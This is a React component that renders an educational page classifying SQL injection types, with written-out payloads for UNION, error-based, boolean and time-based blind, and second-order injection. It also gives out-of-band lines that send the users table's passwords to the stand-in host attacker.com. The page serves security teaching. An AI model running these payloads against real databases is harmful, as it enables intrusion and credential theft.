import React from "react";

const SQLInjectionTypes: React.FC = () => (
  <div className="p-8 space-y-8 rounded-xl shadow-lg mt-20">
    <h1 className="text-4xl font-extrabold border-b-2 pb-2">
      SQL Injection Types
    </h1>
    <p className="text-sm text-gray-500">Last Updated: 16 Jan, 2026</p>

    <p className="text-lg leading-relaxed">
      SQL Injection attacks can be categorized based on how attackers extract data from the
      database. Understanding these types helps security professionals identify and defend
      against various attack techniques.
    </p>

    <h2 className="text-3xl font-bold mt-8">SQL Injection Categories</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Type</th>
            <th className="p-3 border">Visibility</th>
            <th className="p-3 border">Data Extraction</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">In-Band (Classic)</td>
            <td className="p-3 border">Results visible</td>
            <td className="p-3 border">Direct from response</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Blind SQLi</td>
            <td className="p-3 border">Results not visible</td>
            <td className="p-3 border">Inference from behavior</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Out-of-Band</td>
            <td className="p-3 border">Results not visible</td>
            <td className="p-3 border">Different channel (DNS/HTTP)</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">1. In-Band SQL Injection</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`A. UNION-Based SQLi:
Uses UNION to combine results with attacker's query

Original Query:
SELECT name, price FROM products WHERE id = '1'

Injected:
SELECT name, price FROM products WHERE id = '1'
UNION SELECT username, password FROM users--'

Result: Both product data AND user credentials displayed

Requirements:
- Same number of columns
- Compatible data types
- Results displayed on page

B. Error-Based SQLi:
Extracts data through error messages

Injected:
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--

Error Message:
"Conversion failed when converting 'admin' to int"

Result: Username revealed in error message`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">2. Blind SQL Injection</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`A. Boolean-Based Blind SQLi:
Determines true/false based on page response

Test for vulnerability:
?id=1 AND 1=1  → Page loads normally (TRUE)
?id=1 AND 1=2  → Page different/error (FALSE)

Extract data character by character:
?id=1 AND SUBSTRING(username,1,1)='a'  → FALSE
?id=1 AND SUBSTRING(username,1,1)='b'  → TRUE
(First character is 'b')

B. Time-Based Blind SQLi:
Determines true/false based on response delay

MySQL:
?id=1 AND IF(1=1, SLEEP(5), 0)
(5 second delay = TRUE)

SQL Server:
?id=1; WAITFOR DELAY '0:0:5'--

PostgreSQL:
?id=1; SELECT pg_sleep(5)--

Example extraction:
?id=1 AND IF(SUBSTRING(password,1,1)='a',
SLEEP(5),0)
(5 sec delay means first char is 'a')`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">3. Out-of-Band SQL Injection</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Out-of-Band SQLi uses external channels:

DNS Exfiltration (SQL Server):
EXEC master..xp_dirtree
'\\\\attacker.com\\' + (SELECT password FROM users)

HTTP Request (Oracle):
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||
(SELECT password FROM users)) FROM dual;

XXE in Oracle:
SELECT extractvalue(xmltype('<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://attacker.com/'||(SELECT password FROM users)||
'">%remote;]><root/>'),'/root') FROM dual;

When to Use:
- Blind SQLi is too slow
- Firewall blocks time-based techniques
- Database has external network access`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Second-Order SQL Injection</h2>
    <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg mt-4">
      <p className="mb-2"><strong>Definition:</strong> Payload stored first, executed later in different context</p>
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li><strong>Step 1:</strong> Register username: admin&apos;--</li>
        <li><strong>Step 2:</strong> Change password feature uses stored username</li>
        <li><strong>Step 3:</strong> Query becomes: UPDATE users SET password=&apos;new&apos; WHERE user=&apos;admin&apos;--&apos;</li>
        <li><strong>Result:</strong> Admin password changed instead of attacker&apos;s</li>
      </ul>
    </div>

    <h2 className="text-3xl font-bold mt-8">Key Points to Remember</h2>
    <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li>In-band SQLi is easiest to exploit when results are visible</li>
        <li>UNION attacks require matching column counts and data types</li>
        <li>Blind SQLi extracts data through inference, slower but effective</li>
        <li>Time-based blind SQLi can bypass many security controls</li>
        <li>Out-of-band requires database server to make external connections</li>
        <li>Second-order SQLi is often missed in security testing</li>
      </ul>
    </div>
  </div>
);

export default SQLInjectionTypes;
